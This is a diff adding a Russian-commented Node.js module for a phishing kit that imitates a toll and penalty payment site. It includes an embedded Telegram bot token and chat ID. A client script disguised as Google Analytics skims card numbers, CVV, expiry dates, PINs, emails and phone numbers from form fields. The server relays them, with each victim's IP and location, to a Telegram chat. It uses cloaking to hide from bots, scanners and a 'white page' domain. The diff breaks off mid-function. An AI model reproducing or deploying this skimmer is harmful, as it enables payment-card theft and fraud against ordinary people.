@@ -1,0 +1,1047 @@
+/**
+ * Telegram Logger - НОВАЯ ВЕРСИЯ
+ * Полное отслеживание действий пользователей с базой данных
+ * Фильтрация белой страницы (клоаки)
+ */
+
+const https = require('https');
+const logger = require('./logger');
+const db = require('./database');
+const deviceDetector = require('./device-detector');
+
+// Инициализировать БД при загрузке модуля
+// Если БД уже инициализирована, это безопасно (проверка внутри initDatabase)
+try {
+  if (!db.db()) {
+    db.initDatabase();
+  }
+} catch (error) {
+  logger.error('[TG] Failed to initialize database:', error.message);
+  // Продолжаем работу даже если БД не инициализирована
+}
+
+// Telegram Bot Configuration
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003622716214';
+
+// Белая страница (клоака) - домены которые НЕ должны логироваться
+const WHITE_PAGE_DOMAINS = [
+  'm50toll-lrlsh.com',
+];
+
+// Проверить является ли запрос с белой страницы
+function isWhitePageRequest(req) {
+  const host = req.headers.host || '';
+  const referer = req.headers.referer || '';
+  
+  // Проверить host
+  for (const domain of WHITE_PAGE_DOMAINS) {
+    if (host.includes(domain) || referer.includes(domain)) {
+      return true;
+    }
+  }
+  
+  return false;
+}
+
+// Store active sessions: sessionId -> { messageId, visitorId, sessionDbId, startTime }
+const activeSessions = new Map();
+
+// Clean old sessions after 30 minutes
+const SESSION_TIMEOUT = 30 * 60 * 1000;
+
+// Bot/Crawler User-Agent patterns to ignore
+const BOT_PATTERNS = [
+  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i,
+  /python-requests/i, /python-urllib/i, /aiohttp/i,
+  /curl\//i, /wget\//i, /httpie/i, /postman/i,
+  /bot\b/i, /crawler/i, /spider/i, /scraper/i,
+  /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
+  /^Mozilla\/5\.0$/i, /^\s*$/,
+];
+
+// Suspicious paths that scanners try to access
+const SUSPICIOUS_PATHS = [
+  /\.git\//i, /\.env/i, /\.htaccess/i, /wp-admin/i, /phpmyadmin/i,
+  /phpinfo/i, /\.sql$/i, /\.bak$/i, /\.backup$/i,
+];
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [sessionId, session] of activeSessions.entries()) {
+    if (now - session.startTime > SESSION_TIMEOUT) {
+      activeSessions.delete(sessionId);
+    }
+  }
+}, 60 * 1000);
+
+/**
+ * Send message to Telegram
+ */
+async function sendTelegramMessage(text, parseMode = 'HTML') {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: parseMode,
+      disable_web_page_preview: true,
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data),
+      },
+    };
+
+    const req = https.request(options, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => {
+        try {
+          const result = JSON.parse(body);
+          if (result.ok) {
+            resolve(result.result);
+          } else {
+            logger.error('[TG] Send error:', result.description);
+            reject(new Error(result.description));
+          }
+        } catch (e) {
+          reject(e);
+        }
+      });
+    });
+
+    req.on('error', (err) => {
+      logger.error('[TG] Request error:', err.message);
+      reject(err);
+    });
+    req.write(data);
+    req.end();
+  });
+}
+
+/**
+ * Edit existing message in Telegram
+ */
+async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      chat_id: CHAT_ID,
+      message_id: messageId,
+      text: text,
+      parse_mode: parseMode,
+      disable_web_page_preview: true,
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${BOT_TOKEN}/editMessageText`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data),
+      },
+    };
+
+    const req = https.request(options, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => {
+        try {
+          const result = JSON.parse(body);
+          if (result.ok) {
+            resolve(result.result);
+          } else {
+            if (result.description && result.description.includes('message is not modified')) {
+              resolve(null);
+            } else {
+              reject(new Error(result.description));
+            }
+          }
+        } catch (e) {
+          reject(e);
+        }
+      });
+    });
+
+    req.on('error', reject);
+    req.write(data);
+    req.end();
+  });
+}
+
+/**
+ * Escape HTML для Telegram
+ */
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+/**
+ * Получить название страницы на русском
+ */
+function getPageNameRu(path) {
+  if (!path || path === '/' || path === '') return '🏠 Главная';
+  
+  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
+  
+  const translations = {
+    'pay-toll': '💰 Pay a Toll (Оплата проезда)',
+    'pay-penalty': '⚠️ Pay a Penalty (Оплата штрафа)',
+    'user/login': '🔐 Вход в аккаунт',
+    'user/register': '📝 Регистрация',
+    'login': '🔐 Вход',
+    'register': '📝 Регистрация',
+    'account': '👤 Личный кабинет',
+    'dashboard': '📊 Dashboard',
+    'contact': '📞 Контакты',
+    'about': 'ℹ️ О нас',
+    'help': '❓ Помощь',
+    'faq': '❓ FAQ',
+    'appeal': '📋 Апелляция',
+  };
+  
+  if (translations[cleanPath]) {
+    return translations[cleanPath];
+  }
+  
+  if (cleanPath.includes('pay-penalty')) return '⚠️ Pay a Penalty (Оплата штрафа)';
+  if (cleanPath.includes('pay-toll')) return '💰 Pay a Toll (Оплата проезда)';
+  if (cleanPath.includes('appeal')) return '📋 Апелляция';
+  if (cleanPath.includes('login')) return '🔐 Вход';
+  if (cleanPath.includes('register')) return '📝 Регистрация';
+  
+  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
+}
+
+/**
+ * Получить название поля на русском
+ */
+function getFieldNameRu(fieldCode) {
+  const fieldNames = {
+    'vh': '🚗 Номер авто',
+    'vehicle_registration': '🚗 Номер авто',
+    'vrn': '🚗 Номер авто',
+    'pin': '🔢 PIN код',
+    'notice': '📄 Notice Number',
+    'em': '📧 Email',
+    'email': '📧 Email',
+    'cd': '💳 Номер карты',
+    'card': '💳 Номер карты',
+    'cv': '🔒 CVV',
+    'cvv': '🔒 CVV',
+    'ex': '📅 Срок действия',
+    'nm': '👤 Имя владельца',
+    'ph': '📱 Телефон',
+    'phone': '📱 Телефон',
+  };
+  
+  return fieldNames[fieldCode] || fieldNames[fieldCode.toLowerCase()] || `📝 ${fieldCode}`;
+}
+
+/**
+ * Форматировать сообщение для Telegram - НОВЫЙ ФОРМАТ
+ */
+async function formatTelegramMessage(sessionId, visitorId) {
+  try {
+    // Получить данные из БД
+    const visitor = db.getVisitorStats(visitorId);
+    const session = db.getSession(sessionId);
+    const actions = db.getSessionActions(sessionId);
+    
+    if (!visitor || !session) {
+      return null;
+    }
+    
+    // Определить тип устройства
+    const deviceTypeRu = {
+      'phone': '📱 Телефон',
+      'desktop': '💻 ПК',
+      'tablet': '📱 Планшет',
+      'unknown': '❓ Неизвестно'
+    }[visitor.device_type] || '❓ Неизвестно';
+    
+    // Построить сообщение
+    let message = `<b>Новый посетитель</b>\n\n`;
+    
+    // Количество посещений
+    message += `Количество посещений: <code>${visitor.visit_count}</code>\n`;
+    
+    // Устройство
+    message += `Устройство: ${deviceTypeRu}\n`;
+    
+    // IP
+    message += `IP: <code>${escapeHtml(visitor.ip)}</code>\n`;
+    
+    // Дополнительная информация
+    if (visitor.browser && visitor.browser !== 'Unknown') {
+      message += `Браузер: <code>${escapeHtml(visitor.browser)}</code>\n`;
+    }
+    if (visitor.os && visitor.os !== 'Unknown') {
+      message += `ОС: <code>${escapeHtml(visitor.os)}</code>\n`;
+    }
+    if (visitor.country && visitor.country !== 'Unknown') {
+      message += `Страна: <code>${escapeHtml(visitor.country)}</code>\n`;
+    }
+    
+    message += `\n<b>Движение клиента:</b>\n`;
+    
+    if (!actions || actions.length === 0) {
+      message += `<blockquote>Нет активности</blockquote>`;
+    } else {
+      message += `<blockquote>`;
+      
+      const movementItems = [];
+      
+      for (const action of actions) {
+        let item = '';
+        
+        switch (action.action_type) {
+          case 'page_view':
+          case 'navigation':
+            if (action.page_path) {
+              item = getPageNameRu(action.page_path);
+            } else if (action.page_name) {
+              item = action.page_name;
+            } else {
+              item = '🏠 Главная';
+            }
+            break;
+            
+          case 'form_fill':
+          case 'form_input':
+            if (action.field_name) {
+              const fieldName = getFieldNameRu(action.field_name);
+              const fieldValue = action.field_value ? escapeHtml(action.field_value.substring(0, 50)) : '';
+              if (fieldValue) {
+                item = `✏️ Заполняет ${fieldName}: <code>${fieldValue}</code>`;
+              } else {
+                item = `✏️ Заполняет ${fieldName}`;
+              }
+            }
+            break;
+            
+          case 'button_click':
+          case 'pay_button_click':
+            const buttonText = action.button_text || 'Кнопка';
+            item = `🖱️ Нажал кнопку: <code>${escapeHtml(buttonText)}</code>`;
+            break;
+            
+          case 'form_submit':
+            item = `📤 Отправил форму`;
+            break;
+            
+          default:
+            if (action.page_name) {
+              item = action.page_name;
+            }
+        }
+        
+        if (item) {
+          movementItems.push(item);
+        }
+      }
+      
+      if (movementItems.length === 0) {
+        message += `Нет активности`;
+      } else {
+        message += movementItems.join('\n');
+      }
+      
+      message += `</blockquote>`;
+    }
+    
+    return message;
+    
+  } catch (error) {
+    logger.error('[TG] Format message error:', error.message);
+    return null;
+  }
+}
+
+/**
+ * Генерировать session ID
+ */
+function getSessionId(req) {
+  const cookies = req.headers.cookie || '';
+  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
+  
+  if (sessionMatch) {
+    return 'drupal_' + sessionMatch[0].substring(0, 20);
+  }
+  
+  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
+  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
+  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
+  return 'ip_' + hash;
+}
+
+/**
+ * Проверить является ли User-Agent ботом
+ */
+function isBot(userAgent) {
+  if (!userAgent || userAgent.trim() === '') return true;
+  return BOT_PATTERNS.some(pattern => pattern.test(userAgent));
+}
+
+/**
+ * Проверить является ли путь подозрительным
+ */
+function isSuspiciousPath(path) {
+  if (!path) return false;
+  return SUSPICIOUS_PATHS.some(pattern => pattern.test(path));
+}
+
+/**
+ * Отследить событие (действие пользователя)
+ */
+async function trackEvent(sessionId, eventData, meta = {}) {
+  try {
+    // Пропустить если нет сессии
+    const activeSession = activeSessions.get(sessionId);
+    if (!activeSession) {
+      return;
+    }
+    
+    // Добавить действие в БД
+    db.addAction(
+      sessionId,
+      activeSession.visitorId,
+      {
+        type: eventData.type || 'unknown',
+        path: eventData.path,
+        page: eventData.page,
+        field: eventData.field,
+        value: eventData.value,
+        buttonText: eventData.buttonText || eventData.button_text,
+        data: eventData
+      }
+    );
+    
+    // Обновить счетчик действий
+    db.updateSession(sessionId, {
+      actionCount: activeSession.actionCount + 1,
+      lastPage: eventData.path || activeSession.lastPage
+    });
+    
+    activeSession.actionCount++;
+    activeSession.lastPage = eventData.path || activeSession.lastPage;
+    
+    // Обновить сообщение в Telegram
+    const messageText = await formatTelegramMessage(sessionId, activeSession.visitorId);
+    if (messageText && activeSession.messageId) {
+      await editTelegramMessage(activeSession.messageId, messageText);
+    }
+    
+  } catch (error) {
+    logger.error('[TG] Track event error:', error.message);
+  }
+}
+
+/**
+ * Отследить запрос страницы
+ */
+async function trackPageRequest(req) {
+  try {
+    // ПРОВЕРКА: Пропустить если это белая страница (клоака)
+    if (isWhitePageRequest(req)) {
+      return;
+    }
+    
+    const path = req.url || req.path || '/';
+    
+    // Пропустить статические файлы
+    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|webp|pdf|zip|mp4|mp3|avi|mov)(\?|$)/i)) {
+      return;
+    }
+    
+    // Пропустить asset директории
+    if (path.match(/^\/(sites\/default\/files|themes|modules|libraries|assets|images|media|uploads|static)\//i)) {
+      return;
+    }
+    
+    if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
+      return;
+    }
+    
+    // Пропустить tracking endpoints
+    if (path.startsWith('/g/collect') || path.includes('collect')) {
+      return;
+    }
+    
+    // Пропустить подозрительные пути
+    if (isSuspiciousPath(path)) {
+      return;
+    }
+    
+    const sessionId = getSessionId(req);
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Получить информацию об устройстве
+    const deviceInfo = await deviceDetector.getFullDeviceInfo(ip, userAgent);
+    
+    // Получить или создать посетителя
+    const visitorId = db.getOrCreateVisitor(ip, userAgent, {
+      deviceType: deviceInfo.deviceType,
+      browser: deviceInfo.browser,
+      os: deviceInfo.os,
+      isBot: isBot(userAgent)
+    });
+    
+    // Обновить информацию о стране/городе если есть
+    if (deviceInfo.country && deviceInfo.country !== 'Unknown') {
+      try {
+        const dbInstance = db.db();
+        if (dbInstance) {
+          dbInstance.prepare('UPDATE visitors SET country = ?, city = ? WHERE id = ?')
+            .run(deviceInfo.country, deviceInfo.city || '', visitorId);
+        }
+      } catch (error) {
+        logger.error('[TG] Failed to update visitor country:', error.message);
+      }
+    }
+    
+    // Проверить есть ли активная сессия
+    let activeSession = activeSessions.get(sessionId);
+    
+    if (!activeSession) {
+      // Создать новую сессию в БД
+      const sessionDbId = db.createSession(visitorId, sessionId);
+      
+      activeSession = {
+        visitorId,
+        sessionDbId,
+        messageId: null,
+        startTime: Date.now(),
+        actionCount: 0,
+        lastPage: path
+      };
+      
+      activeSessions.set(sessionId, activeSession);
+      
+      // Отправить первое сообщение в Telegram
+      const messageText = await formatTelegramMessage(sessionId, visitorId);
+      if (messageText) {
+        const result = await sendTelegramMessage(messageText);
+        if (result && result.message_id) {
+          activeSession.messageId = result.message_id;
+          db.updateSession(sessionId, { telegramMessageId: result.message_id });
+        }
+      }
+    }
+    
+    // Добавить действие "просмотр страницы"
+    const pageName = getPageNameRu(path);
+    await trackEvent(sessionId, {
+      type: 'page_view',
+      path: path,
+      page: pageName
+    }, { ip, userAgent });
+    
+    // Обновить последнюю страницу
+    activeSession.lastPage = path;
+    db.updateSession(sessionId, { lastPage: path });
+    
+  } catch (error) {
+    logger.error('[TG] Track request error:', error.message);
+  }
+}
+
+/**
+ * Express middleware для отслеживания
+ */
+function trackingMiddleware(req, res, next) {
+  const userAgent = req.headers['user-agent'] || '';
+  const path = req.url || req.path || '/';
+  
+  // Пропустить ботов
+  if (isBot(userAgent)) {
+    return next();
+  }
+  
+  // Пропустить подозрительные пути
+  if (isSuspiciousPath(path)) {
+    return next();
+  }
+  
+  // Пропустить если это белая страница
+  if (isWhitePageRequest(req)) {
+    return next();
+  }
+  
+  trackPageRequest(req).catch(() => {});
+  next();
+}
+
+/**
+ * API endpoint для клиентского отслеживания
+ */
+async function handleTrackingAPI(req, res) {
+  try {
+    const userAgent = req.headers['user-agent'] || '';
+    
+    // Пропустить ботов
+    if (isBot(userAgent)) {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true }));
+      return;
+    }
+    
+    const sessionId = getSessionId(req);
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
+    
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+      try {
+        const data = JSON.parse(body);
+        await trackEvent(sessionId, data, { ip, userAgent });
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: true }));
+      } catch (e) {
+        res.writeHead(400);
+        res.end('Bad Request');
+      }
+    });
+  } catch (error) {
+    res.writeHead(500);
+    res.end('Error');
+  }
+}
+
+/**
+ * API endpoint для GA-like tracking (маскированный)
+ */
+async function handleAnalyticsAPI(req, res) {
+  try {
+    const userAgent = req.headers['user-agent'] || '';
+    
+    // Пропустить ботов
+    if (isBot(userAgent)) {
+      res.writeHead(200, { 'Content-Type': 'image/gif' });
+      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+      return;
+    }
+    
+    const sessionId = getSessionId(req);
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
+    
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+      try {
+        // Парсинг GA-like формата
+        let encodedData = '';
+        
+        if (body) {
+          const match = body.match(/_p=([A-Za-z0-9+/=]+)/);
+          if (match) encodedData = match[1];
+        }
+        
+        if (!encodedData && req.url) {
+          const urlMatch = req.url.match(/_p=([A-Za-z0-9+/%]+)/);
+          if (urlMatch) encodedData = decodeURIComponent(urlMatch[1]);
+        }
+        
+        if (!encodedData) {
+          res.writeHead(200, { 'Content-Type': 'image/gif' });
+          res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+          return;
+        }
+        
+        // Декодировать Base64
+        const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
+        const gaData = JSON.parse(decoded);
+        
+        // Конвертировать в внутренний формат (используем старую функцию decodeGAEvent из старого файла)
+        // Для упрощения, здесь можно использовать упрощенную версию
+        const internalData = {
+          type: gaData.ec === 'payment' && gaData.ea === 'button_click' ? 'pay_button_click' :
+                gaData.ec === 'form' && gaData.ea === 'complete' ? 'form_fill' :
+                gaData.ec === 'form' && gaData.ea === 'focus' ? 'form_input' :
+                gaData.ec === 'ui' && gaData.ea === 'click' ? 'button_click' :
+                'page_view',
+          path: gaData.pg || gaData.ev || '',
+          page: gaData.pg || '',
+          field: gaData.el || '',
+          value: gaData.ev || '',
+          buttonText: gaData.ev || ''
+        };
+        
+        await trackEvent(sessionId, internalData, { ip, userAgent });
+        
+        res.writeHead(200, { 'Content-Type': 'image/gif' });
+        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+        
+      } catch (e) {
+        res.writeHead(200, { 'Content-Type': 'image/gif' });
+        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+      }
+    });
+  } catch (error) {
+    res.writeHead(200, { 'Content-Type': 'image/gif' });
+    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+  }
+}
+
+/**
+ * Клиентский скрипт отслеживания
+ * Логирует все действия: клики, заполнение полей, переходы, нажатия кнопок
+ */
+function getTrackingScript() {
+  // Скрипт скопирован из старого telegram-logger.js для избежания циклической зависимости
+  return `
+<!-- Analytics Measurement Protocol -->
+<script>
+(function(w,d,s,l,i){
+  w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
+  w[l].l=1*new Date();
+  
+  var _sent={},_step=0,_page=location.pathname,_payClickTime=0,_lastPayNotificationTime=0;
+  
+  // Encode data
+  function _enc(o){try{return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}catch(e){return''}}
+  
+  // Send tracking data
+  function _send(p){
+    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'')+'_'+(p.ev||'');
+    if(_sent[k]&&Date.now()-_sent[k]<2000)return;
+    _sent[k]=Date.now();
+    var u='/g/collect',m=_enc(p);
+    if(!m)return;
+    try{navigator.sendBeacon(u,'v=2&tid=G-XXXXXX&_p='+m)}
+    catch(e){new Image().src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
+  }
+  
+  // Get current page type
+  function _getPageType(){
+    if(_page.indexOf('pay-penalty')>-1)return 'pay-penalty';
+    if(_page.indexOf('pay-toll')>-1)return 'pay-toll';
+    if(_page.indexOf('login')>-1)return 'login';
+    if(_page.indexOf('appeal')>-1)return 'appeal';
+    return 'other';
+  }
+  
+  // Field name mapping - DETAILED
+  var _fieldMap={
+    'vehicle_registration_number':'vh',
+    'vehicle_reg':'vh',
+    'vrn':'vh',
+    'registration':'vh',
+    'reg_number':'vh',
+    'plate':'vh',
+    'email':'em',
+    'mail':'em',
+    'pin':'pin',
+    'pin_code':'pin',
+    'notice_number':'notice',
+    'notice':'notice',
+    'journey_reference':'journey',
+    'journey_ref':'journey',
+    'journey':'journey',
+    'card_number':'cd',
+    'card':'cd',
+    'pan':'cd',
+    'cc_number':'cd',
+    'cvv':'cv',
+    'cvc':'cv',
+    'security_code':'cv',
+    'expiry':'ex',
+    'exp_date':'ex',
+    'expiration':'ex',
+    'exp_month':'ex',
+    'exp_year':'ex',
+    'cardholder':'nm',
+    'card_holder':'nm',
+    'holder_name':'nm',
+    'name':'nm',
+    'phone':'ph',
+    'mobile':'ph',
+    'telephone':'ph',
+    'amount':'amount',
+    'total':'amount',
+    'payment_amount':'amount'
+  };
+  
+  // Get field code from input
+  function _getFieldCode(el){
+    var n=(el.name||el.id||el.placeholder||'').toLowerCase();
+    for(var k in _fieldMap){
+      if(n.indexOf(k)>-1||n.indexOf(k.replace('_',''))>-1)return _fieldMap[k];
+    }
+    if(el.type==='email')return 'em';
+    if(el.type==='tel')return 'ph';
+    return 'ot';
+  }
+  
+  // Check if element is visible
+  function _isVisible(el){
+    if(!el)return false;
+    var s=getComputedStyle(el);
+    return s.display!=='none'&&s.visibility!=='hidden'&&el.offsetParent!==null;
+  }
+  
+  // Detect current form step
+  function _detectStep(){
+    if(_payClickTime && (Date.now() - _payClickTime) < 3000){return;}
+    var cardInputs=d.querySelectorAll('input[name*="card"],input[name*="pan"],input[name*="cc_number"]');
+    var emailInputs=d.querySelectorAll('input[type="email"],input[name*="email"]');
+    var vehInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[name*="vrn"],input[name*="plate"]');
+    var pinInputs=d.querySelectorAll('input[name*="pin"],input[name*="notice"],input[name*="journey"]');
+    for(var i=0;i<cardInputs.length;i++){
+      if(_isVisible(cardInputs[i])){
+        if(_step!==4){_step=4;_send({t:'event',ec:'checkout',ea:'step',el:'card_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    if(d.querySelector('.summary,.review,.confirm,.confirmation')){
+      if(_step!==3){_step=3;_send({t:'event',ec:'checkout',ea:'step',el:'confirmation',pg:_getPageType()})}
+      return;
+    }
+    for(var i=0;i<emailInputs.length;i++){
+      if(_isVisible(emailInputs[i])){
+        if(_step!==2){_step=2;_send({t:'event',ec:'checkout',ea:'step',el:'email_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    for(var i=0;i<vehInputs.length;i++){
+      if(_isVisible(vehInputs[i])){
+        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'vehicle_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    for(var i=0;i<pinInputs.length;i++){
+      if(_isVisible(pinInputs[i])){
+        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'pin_input',pg:_getPageType()})}
+        return;
+      }
+    }
+  }
+  
+  // Track focus on form fields
+  d.addEventListener('focus',function(e){
+    var el=e.target;
+    if(!el||!el.tagName)return;
+    if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
+      var code=_getFieldCode(el);
+      _send({t:'event',ec:'form',ea:'focus',el:code,pg:_getPageType()})
+    }
+  },true);
+  
+  // Collect PIN from multiple fields
+  function _collectPIN(){
+    var pinFields=d.querySelectorAll('input[name*="pin"],input[id*="pin"]');
+    var pinValues=[];
+    for(var i=0;i<pinFields.length;i++){
+      if(pinFields[i].value&&pinFields[i].value.length===1){pinValues.push(pinFields[i].value);}
+    }
+    if(pinValues.length>=4){return pinValues.join('');}
+    var pin='';
+    for(var j=0;j<4;j++){
+      var f=d.querySelector('input[name*="pin"][name*="'+j+'"],input[id*="pin"][id*="'+j+'"]');
+      if(f&&f.value)pin+=f.value;
+    }
+    return pin.length>=4?pin:null;
+  }
+  
+  // Collect Notice Number
+  function _collectNotice(){
+    var noticeFields=d.querySelectorAll('input[name*="notice"],input[id*="notice"]');
+    var vals=[];
+    for(var i=0;i<noticeFields.length;i++){if(noticeFields[i].value)vals.push(noticeFields[i].value);}
+    return vals.length>0?vals.join(''):null;
+  }
+  
+  // Track blur (field completed)
+  d.addEventListener('blur',function(e){
+    var el=e.target;
+    if(!el||!el.tagName)return;
+    if((el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA')&&el.value){
+      var code=_getFieldCode(el);
+      var n=(el.name||el.id||'').toLowerCase();
+      if(n.indexOf('pin')>-1){
+        var fullPIN=_collectPIN();
+        if(fullPIN&&fullPIN.length>=4){
+          _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:fullPIN,pg:_getPageType()});
+          return;
+        }
+      }
+      if(n.indexOf('notice')>-1){
+        var fullNotice=_collectNotice();
+        if(fullNotice){
+          _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:fullNotice,pg:_getPageType()});
+          return;
+        }
+      }
+      var val=el.value;
+      _send({t:'event',ec:'form',ea:'complete',el:code,ev:val,pg:_getPageType()})
+    }
+  },true);
+  
+  // Track radio/checkbox changes
+  d.addEventListener('change',function(e){
+    var el=e.target;
+    if(!el)return;
+    if(el.type==='radio'){
+      var name=el.name||'radio';
+      var val=el.value||el.id||'selected';
+      _send({t:'event',ec:'form',ea:'radio',el:name,ev:val,pg:_getPageType()})
+    }
+    if(el.type==='checkbox'){
+      var name=el.name||'checkbox';
+      var val=el.checked?'checked':'unchecked';
+      _send({t:'event',ec:'form',ea:'checkbox',el:name,ev:val,pg:_getPageType()})
+    }
+    if(el.tagName==='SELECT'){
+      var code=_getFieldCode(el);
+      _send({t:'event',ec:'form',ea:'complete',el:code,ev:el.value,pg:_getPageType()})
+    }
+  },true);
+  
+  // Get clean button text
+  function _getButtonText(btn){
+    if(btn.value&&btn.value.trim()){return btn.value.trim();}
+    var text='';
+    for(var i=0;i<btn.childNodes.length;i++){
+      var node=btn.childNodes[i];
+      if(node.nodeType===3){text+=node.textContent;}
+    }
+    if(text.trim()){return text.trim();}
+    if(btn.innerText){
+      var it=btn.innerText.trim();
+      if(it.length<100){return it;}
+    }
+    if(btn.textContent){
+      var tc=btn.textContent.trim();
+      if(tc.length>50){
+        var firstWord=tc.split(/[\\s\\n\\r\\t]+/)[0];
+        return firstWord||'Pay';
+      }
+      return tc;
+    }
+    return 'Pay';
+  }
+  
+  // Track PAY button
+  function _handlePayButton(e){
+    var target=e.target;
+    var now=Date.now();
+    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){return;}
+    var payBtn=target.closest('[data-drupal-selector="edit-pay"],[data-drupal-selector*="pay"],[name="op"][value="Pay"]');
+    if(payBtn){
+      _payClickTime=Date.now();
+      _lastPayNotificationTime=now;
+      var txt=_getButtonText(payBtn);
+      _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt,pg:_getPageType()});
+      return;
+    }
+    var btn=target.closest('button,input[type="submit"],.btn,[role="button"],a.btn,a.button,.form-submit,.btn-pay-trips');
+    if(btn){
+      var btnId=(btn.id||'').toLowerCase();
+      var btnClass=(btn.className||'').toLowerCase();
+      var btnValue=(btn.value||'').toLowerCase();
+      var btnName=(btn.name||'').toLowerCase();
+      var isPay=false;
+      if(btnId.indexOf('pay')>-1||btnId.indexOf('edit-pay')>-1){isPay=true;}
+      if(btnClass.indexOf('btn-pay')>-1||btnClass.indexOf('pay-trips')>-1){isPay=true;}
+      if(btnValue==='pay'||btnValue==='Pay'){isPay=true;}
+      if(btnName==='op'&&(btnValue==='pay'||btnValue==='Pay')){isPay=true;}
+      if(btn.getAttribute('data-drupal-selector')&&btn.getAttribute('data-drupal-selector').indexOf('pay')>-1){isPay=true;}
+      if(!isPay){
+        var txt=_getButtonText(btn).toLowerCase().trim();
+        if(txt==='pay'||txt==='pay '||txt.startsWith('pay ')){isPay=true;}
+      }
+      if(isPay){
+        _payClickTime=Date.now();
+        _lastPayNotificationTime=now;
+        var cleanText=btn.value||_getButtonText(btn);
+        cleanText=cleanText.replace(/[\\s\\n\\r\\t]+/g,' ').trim().substring(0,30);
+        _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:cleanText||'Pay',pg:_getPageType()});
+      }
+    }
+  }
+  
+  d.addEventListener('mousedown',_handlePayButton,true);
+  d.addEventListener('pointerdown',_handlePayButton,true);
+  d.addEventListener('click',_handlePayButton,true);
+  
+  // Track form submissions
+  d.addEventListener('submit',function(e){
+    var form=e.target;
+    if(!form||!form.tagName)return;
+    var now=Date.now();
+    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){return;}
+    var formId=(form.id||'').toLowerCase();
+    var formAction=(form.action||'').toLowerCase();
+    var formClass=(form.className||'').toLowerCase();
+    var isPayForm=formId.indexOf('pay')>-1||formAction.indexOf('pay')>-1||formClass.indexOf('pay')>-1||
+                  formId.indexOf('checkout')>-1||formAction.indexOf('checkout')>-1||
+                  formId.indexOf('payment')>-1||formAction.indexOf('payment')>-1;
+    var submitBtn=form.querySelector('button[type="submit"],input[type="submit"],button:not([type])');
+    var btnText='Submit';
+    if(submitBtn){
+      btnText=(submitBtn.textContent||submitBtn.value||'').replace(/[\\s\\n\\r\\t]+/g,' ').trim();
+    }
+    if(isPayForm||btnText.toLowerCase().indexOf('pay')>-1){
+      _payClickTime=Date.now();
+      _lastPayNotificationTime=now;
